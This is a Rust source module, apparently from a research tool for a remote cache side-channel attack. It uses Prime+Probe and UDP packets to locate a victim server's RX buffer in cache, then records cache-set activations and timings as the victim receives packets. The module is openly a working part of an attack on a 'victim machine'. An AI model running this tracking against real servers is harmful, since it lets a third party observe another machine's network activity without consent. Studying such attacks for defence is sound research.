//! # Online Tracking
//! This module is responsible for tracking and gathering measurements on the state
//! of the RX buffer of the victim machine.

mod pattern;
mod tracking;

pub use crate::connection::Time;
use crate::connection::{CacheConnector, PacketSender};
use crate::output::Record;
pub use crate::rpp::params::CacheParams;
pub use crate::rpp::{
    has_activation, ColorCode, ColoredSetCode, Contents, Latencies, ProbeResult, ProbeResult::*,
    Rpp, SetCode,
};
use console::style;
use pattern::{Pattern, PatternIdx, PossiblePatterns};
use std::collections::HashMap;
use std::io::Result;
use std::io::{Error, ErrorKind};
use std::time::Instant;
pub use tracking::SyncStatus;
use tracking::TrackingContext;

pub type LatsEntry = (Vec<ProbeResult<Latencies>>, SyncStatus, Time);
pub type SavedLats = Vec<LatsEntry>;

const REPEATINGS: usize = 8;
const MAX_FAIL_CNT: usize = 100;

/// Builds and sets up `OnlineTracker`
pub struct OnlineTrackerBuilder<C, R, S> {
    conn: Option<C>,
    output: Option<R>,
    sender: Option<S>,
    cparam: Option<CacheParams>,
    quite: bool,
}

impl<C, R, S> Default for OnlineTrackerBuilder<C, R, S> {
    fn default() -> Self {
        OnlineTrackerBuilder {
            conn: None,
            output: None,
            sender: None,
            cparam: None,
            quite: false,
        }
    }
}

impl<C, R, S> OnlineTrackerBuilder<C, R, S> {
    /// Returns new, uninitialized builder
    pub fn new() -> OnlineTrackerBuilder<C, R, S> {
        Default::default()
    }
}

impl<C, R, S> OnlineTrackerBuilder<C, R, S>
where
    C: CacheConnector<Item = Contents>,
    R: Record<LatsEntry>,
    S: PacketSender,
{
    /// Sets connector for the future `OnlineTracker`
    pub fn set_conn(mut self, conn: C) -> Self {
        self.conn = Some(conn);
        self
    }

    /// Sets output to be used in the future `OnlineTracker`
    pub fn set_output(mut self, output: R) -> Self {
        self.output = Some(output);
        self
    }

    /// Sets packet sender to be used in the future `OnlineTracker`
    pub fn set_sender(mut self, sender: S) -> Self {
        self.sender = Some(sender);
        self
    }

    /// Sets the verbosity of the future `OnlineTracker`
    pub fn set_quite(mut self, quite: bool) -> Self {
        self.quite = quite;
        self
    }

    /// Sets cache parameters of the victim
    pub fn set_cache(mut self, cparam: CacheParams) -> Self {
        self.cparam = Some(cparam);
        self
    }

    /// Finalizes the construction. Fails if `conn`, `output`, or `sender` not set.
    pub fn finalize(self) -> Result<OnlineTracker<C, R, S>> {
        let conn = self.conn.ok_or(Error::new(
            ErrorKind::InvalidData,
            "ERROR: connector is not set",
        ))?;

        let output = self.output.ok_or(Error::new(
            ErrorKind::InvalidData,
            "ERROR: output is not set",
        ))?;

        let sender = self.sender.ok_or(Error::new(
            ErrorKind::InvalidData,
            "ERROR: packet sender is not set",
        ))?;

        let cparam = self.cparam.unwrap_or_default();

        let quite = self.quite;

        let rpp = Rpp::with_params(conn, quite, cparam);

        Ok(OnlineTracker {
            rpp,
            output,
            sender,
            pattern: Default::default(),
            quite,
            init: false,
        })
    }
}

/// The main tracking component. Observes cache activity and records
/// victim's interations.
pub struct OnlineTracker<C, R, S> {
    rpp: Rpp<C>,
    output: R,
    sender: S,
    pattern: Pattern,
    quite: bool,
    init: bool,
}

impl<C, R, S> OnlineTracker<C, R, S>
where
    C: CacheConnector<Item = Contents>,
    R: Record<LatsEntry>,
    S: PacketSender,
{
    /// Sets the verbosity of the Online Tracker instance
    pub fn set_quite(&mut self, quite: bool) {
        self.quite = quite;
    }

    pub fn init(&mut self) -> Result<()> {
        let mut err_cnt = 0;
        if !self.quite {
            eprintln!("Online Tracker: {}", style("INITIALIZING").green());
        }

        while let Err(e) = self.locate_rx() {
            err_cnt += 1;
            if err_cnt > MAX_FAIL_CNT {
                return Err(Error::new(
                    ErrorKind::NotConnected,
                    format!(
                        "ERROR: INITIALIZATION FAILED. Could not locate RX buffer in memory: {}",
                        e
                    ),
                ));
            }
        }

        if !self.quite {
            eprintln!(
                "Online Tracker: {}",
                style("INITIALIZATION SUSSESS").green()
            );
        }

        self.init = true;
        Ok(())
    }

    /// Starts online tracking phase.
    ///
    /// # Fails
    ///
    /// Fails if:
    ///
    /// - Priming or probing of sets for a given
    /// - UDP connection for a provided at creation adress fails (cannot send packets)
    /// - No pattern in cache could be found even after retries
    /// - Cannot find the initial possition in RX buffer of the victim server
    ///
    pub fn track(&mut self, cnt: usize) -> Result<()> {
        let quite = self.quite;

        if !self.init {
            return Err(Error::new(
                ErrorKind::InvalidData,
                "ERROR: Online tracker is not initialized. Call init().",
            ));
        }

        if !quite {
            eprintln!(
                "Online Tracker: {}",
                style("Starting tracking measurements").green()
            );
        }

        let mut err_cnt = 0;
        while let Err(e) = self.measure(cnt) {
            err_cnt += 1;

            if err_cnt > MAX_FAIL_CNT {
                return Err(e);
            }
        }

        if !quite {
            eprintln!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );
        }

        Ok(())
    }

    /// Locates the RX buffer in the cache. The buffer is expected to reside
    /// on a single page and be a single for the os (sometimes there might be
    /// multiple RX buffers). Repeats the process if the pattern is indistinctive.
    ///
    /// # Fails
    ///
    /// Fails if Prime or Probe fails, if there are issues with sending UDP
    /// packets to the target, and if the pattern cannot be found in the set
    /// of data.
    fn locate_rx(&mut self) -> Result<()> {
        let patterns = self.locate_rx_round()?;
        self.pattern = Pattern::find(patterns)?;

        Ok(())
    }

    fn locate_rx_round(&mut self) -> Result<PossiblePatterns> {
        let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
        let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();

        for color_code in color_codes.into_iter() {
            let color_len = self.rpp.color_len(color_code);
            let mut pattern = Vec::with_capacity(color_len);
            let set_codes = self
                .rpp
                .iter_color(color_code)
                .collect::<Vec<ColoredSetCode>>();

            for _ in 0..REPEATINGS {
                for &colored_set_code in set_codes.iter() {
                    let set_code = SetCode(color_code, colored_set_code);
                    self.rpp.prime(&set_code)?;
                    // DEBUG this causes connection refused error
                    self.sender.send_packet()?;
                    self.sender.send_packet()?;
                    if self.rpp.probe(&set_code)?.is_activated() {
                        pattern.push(Some(set_code.1));
                    } else {
                        pattern.push(None);
                    }
                }
            }

            patterns.insert(color_code, pattern);
        }

        Ok(patterns)
    }

    fn get_init_pos(&mut self) -> Result<PatternIdx> {
        let mut err_cnt = 0;

        // We prime and probe the first set in the pattern
        // until we register activation
        loop {
            if err_cnt >= MAX_FAIL_CNT {
                return Err(Error::new(
                    ErrorKind::Other,
                    "ERROR: Cannot determine the initial position in RX",
                ));
            }
            if self.rpp.prime(&self.pattern[0]).is_err() {
                err_cnt += 1;
                continue;
            }
            if self.sender.send_packet().is_err() {
                err_cnt += 1;
                continue;
            }
            match self.rpp.probe(&self.pattern[0]) {
                Ok(Activated(_)) => break,
                Err(_) => err_cnt += 1,
                _ => continue,
            }
        }

        // Then we return the next one, as we expect it to be filled next.
        // Therefore, it corresponds to the starting pointer of ring buffer.
        Ok(1)
    }

    fn measure(&mut self, cnt: usize) -> Result<()> {
        let init_pos = self.get_init_pos()?;
        let mut ctx = TrackingContext::new(init_pos);
        let timer = Instant::now();

        for _ in 0..cnt {
            let mut probe_res;
            let es = self.pattern.window(ctx.pos()).copied().collect();
            self.rpp.prime_all(&es)?;

            loop {
                // We should synchronize after every two packets or if the
                // previous synchronization failed. In order to syncronize
                // we need to send our own packet to the server and then
                // see if it activates the expected cache set.
                if ctx.should_inject() {
                    self.sender.send_packet()?;
                    ctx.inject();
                }
                // MAYBE make a newtype for probe_results
                probe_res = self.rpp.probe_all(&es)?;
                // If we measure an activation or injected a packet, then
                // we stop. Any activation in the window should be registered.
                // If the packet got injected, then it is the syncroniztion phase
                // and we should deside on how to handle it
                if has_activation(&probe_res) || ctx.is_injected() {
                    break;
                }
            }

            // if the the *pos* set is activated (which we expect to be activated)
            // then the synchronization is not really needed, and we tacke the next
            // position in the pattern.
            // To get window index, corresponding to the current position, we need
            // to devide the window length by 2 and add one. 
            if probe_res[(es.len() >> 1) + 1].is_activated() && ctx.is_injected() {
                ctx.sync_hit(self.pattern.next_pos(ctx.pos()));
            // if we did not register activation of the *pos* set, then we should
            // recover the position from the probes.
            } else if ctx.is_injected() {
                ctx.sync_miss(self.pattern.recover_next(ctx.pos(), &probe_res)?);
            // this case means that we registered some activation and not synchronizing.
            // we need to save this measurement.
            } else {
                ctx.unsynced_meaurement();
            }

            self.save(
                probe_res,
                ctx.sync_status(),
                timer.elapsed().as_nanos() as Time,
            )?;
        }

        Ok(())
    }

    #[inline(always)]
    // NOTE maybe we do not need to store all the information
    fn save(
        &mut self,
        probes: Vec<ProbeResult<Latencies>>,
        stat: SyncStatus,
        timestamp: Time,
    ) -> Result<()> {
        self.output.record((probes, stat, timestamp))
    }
}

#[cfg(test)]
mod tests {
    use super::pattern::Pattern;
    use super::*;

    #[test]
    fn pattern_finding() {
        let measurements = vec![
            Some(1),
            Some(9),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            None,
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(8),
            Some(2),
            Some(4),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            None,
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            None,
        ];

        let expected: Pattern =
            vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)].into();

        let mut hm = HashMap::new();
        hm.insert(0, measurements);

        let pattern = Pattern::find(hm).expect("No pattern found");
        assert_eq!(expected, pattern, "The pattern is incorrect");
    }
}
